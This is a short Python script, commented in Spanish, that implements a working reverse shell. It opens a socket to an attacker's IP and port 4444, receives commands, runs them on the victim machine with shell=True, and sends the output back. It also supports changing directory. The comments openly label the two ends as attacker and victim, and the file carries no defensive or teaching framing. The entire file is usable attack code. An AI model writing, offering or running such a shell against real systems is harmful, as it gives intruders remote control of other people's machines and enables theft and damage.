import socket
import subprocess
import os

# Dirección IP y puerto del servidor (la máquina atacante)
SERVER_IP = '192.168.1.100'  # Cambia a la IP del atacante
SERVER_PORT = 4444           # Cambia al puerto que uses

def reverse_shell():
    try:
        # Crear un socket para la conexión
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_IP, SERVER_PORT))

        # Redirigir la entrada, salida y errores a la conexión de la shell
        s.send(str.encode("Conexión establecida.\n"))

        while True:
            # Recibe comando del servidor
            command = s.recv(1024).decode('utf-8')
            
            if command.lower() == 'exit':
                break

            # Ejecuta el comando en la máquina de la víctima
            if command[:2] == 'cd':
                try:
                    os.chdir(command[3:])
                    s.send(str.encode(f'Changed directory to {os.getcwd()}\n'))
                except Exception as e:
                    s.send(str.encode(f'Error: {str(e)}\n'))
            else:
                result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = result.stdout.read() + result.stderr.read()
                s.send(output)
        s.close()
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    reverse_shell()
